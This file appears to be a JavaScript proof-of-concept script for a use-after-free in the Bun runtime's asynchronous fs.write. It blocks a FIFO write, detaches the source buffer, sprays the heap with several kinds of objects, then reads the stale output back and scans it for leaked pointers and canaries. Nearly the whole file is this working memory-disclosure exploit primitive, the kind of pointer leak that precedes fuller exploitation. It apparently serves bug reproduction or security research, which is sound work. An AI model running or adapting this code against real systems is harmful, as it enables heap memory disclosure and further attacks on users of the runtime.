import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const sprayMode = process.env.SPRAY || "array-refs";
const iterations = Number(process.env.ITERATIONS || 16);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const sourceFill = 0x51;
const marker = Buffer.from(`BUN_OVERLAP_${sprayMode.toUpperCase()}`);

const retained = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(iteration) {
  const path = join(tmpdir(), `bun-fs-write-overlap-scan-${process.pid}-${iteration}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try {
      fs.closeSync(fd);
    } catch {}
  }
  try {
    fs.unlinkSync(fifo.path);
  } catch {}
}

function isAgain(e) {
  return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const written = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (written === 0) break;
      filled += written;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;

  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }

    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }

  return Buffer.concat(chunks, total);
}

function allocateByteCanaries() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(size));
    view.fill(0x7a);
    view.set(marker.subarray(0, Math.min(marker.length, view.length)), 0);
    out.push(view);
  }
  return out;
}

function allocateArrayRefs() {
  const anchors = Array.from({ length: 64 }, (_, i) => ({ i, marker: `anchor-${i}` }));
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = anchors[(i + j) & 63];
    out.push(arr);
  }
  return out;
}

function allocateArrayDoubles() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = 13.37 + i + (j / 1024);
    out.push(arr);
  }
  return out;
}

function allocateObjectProps() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const obj = {};
    for (let j = 0; j < Math.min(slots, 512); j++) obj[`p${j}`] = { i, j };
    out.push(obj);
  }
  return out;
}

function allocateMaps() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const map = new Map();
    for (let j = 0; j < Math.min(slots, 512); j++) map.set(`k${i}:${j}`, { i, j });
    out.push(map);
  }
  return out;
}

function allocateUrls() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const params = new URLSearchParams();
    for (let j = 0; j < Math.min(slots, 512); j++) params.append(`k${j}`, `v${i}-${j}`);
    out.push(params);
  }
  return out;
}

function allocateSpray() {
  switch (sprayMode) {
    case "byte-canary":
      return allocateByteCanaries();
    case "array-refs":
      return allocateArrayRefs();
    case "array-doubles":
      return allocateArrayDoubles();
    case "object-props":
      return allocateObjectProps();
    case "maps":
      return allocateMaps();
    case "urls":
      return allocateUrls();
    default:
      throw new Error("SPRAY must be byte-canary, array-refs, array-doubles, object-props, maps, or urls");
  }
}

function readU64LE(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function isPointerLike(value) {
  if ((value & 0x7n) !== 0n) return false;
  if (value < 0x100000000n) return false;
  if (value > 0x00007ffffffffffen) return false;
  const hi = Number((value >> 40n) & 0xffn);
  return hi !== 0x51 && hi !== 0x7a && hi !== 0x2e;
}

function classify(output) {
  let sourceFillCount = 0;
  let zeroCount = 0;
  for (const byte of output) {
    if (byte === sourceFill) sourceFillCount++;
    if (byte === 0) zeroCount++;
  }

  const markerOffset = output.indexOf(marker);
  const pointers = [];
  const seen = new Set();
  for (let offset = 0; offset + 8 <= output.length; offset += 8) {
    const value = readU64LE(output, offset);
    if (!isPointerLike(value)) continue;
    const hex = `0x${value.toString(16).padStart(16, "0")}`;
    if (seen.has(hex)) continue;
    seen.add(hex);
    pointers.push({ offset, value: hex });
    if (pointers.length >= 16) break;
  }

  const doubleSamples = [];
  const view = new DataView(output.buffer, output.byteOffset, output.byteLength);
  for (let offset = 0; offset + 8 <= output.length; offset += 8) {
    const value = view.getFloat64(offset, true);
    if (!Number.isFinite(value)) continue;
    if (value < 1 || value > 10000) continue;
    if (Math.abs(value - Math.round(value)) < 0.000001) continue;
    doubleSamples.push({ offset, value: Number(value.toFixed(6)) });
    if (doubleSamples.length >= 16) break;
  }

  return {
    markerOffset,
    sourceFillRatio: Number((sourceFillCount / output.length).toFixed(4)),
    zeroRatio: Number((zeroCount / output.length).toFixed(4)),
    pointerLikeCount: pointers.length,
    pointerSamples: pointers,
    doubleSamples,
    prefix: [...output.subarray(0, 64)],
  };
}

async function runOne(iteration) {
  const fifo = makeFifo(iteration);
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(size);
    const view = new Uint8Array(ab);
    view.fill(sourceFill);

    let writeDone = false;
    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, view, 0, view.byteLength, null, (err, bytesWritten) => {
        writeDone = true;
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();
    retained.length = 0;
    retained.push(...allocateSpray());
    gcNow();

    await readExact(fifo, filled, "prefill");
    const output = await readExact(fifo, size, "stale output");
    const result = await done;
    const stats = classify(output);

    console.log(JSON.stringify({
      iteration,
      sprayMode,
      size,
      sprayCount,
      slots,
      bytesWritten: result.bytesWritten,
      writeDone,
      err: result.err?.message,
      ...stats,
    }));

    return stats.markerOffset !== -1 || stats.pointerLikeCount >= 4 || stats.sourceFillRatio < 0.95;
  } finally {
    closeFifo(fifo);
  }
}

let interesting = false;
for (let i = 1; i <= iterations; i++) {
  if (await runOne(i)) {
    interesting = true;
    break;
  }
}

process.exitCode = interesting ? 86 : 0;
